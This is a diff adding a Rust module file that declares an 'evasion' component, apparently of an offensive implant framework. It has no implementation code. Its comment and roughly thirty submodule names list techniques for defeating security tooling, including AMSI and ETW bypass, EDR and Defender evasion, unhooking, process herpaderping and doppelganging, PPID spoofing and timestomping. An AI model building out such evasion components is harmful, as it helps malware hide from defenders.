@@ -1,0 +1,29 @@
+//! Evasion techniques - ETW bypass, AMSI bypass, Direct Syscall, Unhooking, Module unlinking, Sleep obfuscation
+
+pub mod amsi;
+pub mod antivm;
+pub mod callback_ops;
+pub mod cfg;
+pub mod defender;
+pub mod doppel;
+pub mod edr;
+pub mod etw;
+pub mod firewall;
+pub mod fluctuation;
+pub mod gargoyle;
+pub mod ghost;
+pub mod herpaderp;
+pub mod hwbp;
+pub mod hypervisor;
+pub mod ppid;
+pub mod retspoof;
+pub mod sentinel;
+pub mod sleep;
+pub mod stealth_score;
+pub mod syscall;
+pub mod sysmon;
+pub mod testsign;
+pub mod timestomp;
+pub mod unhook;
+pub mod unlink;
+pub mod wdac;
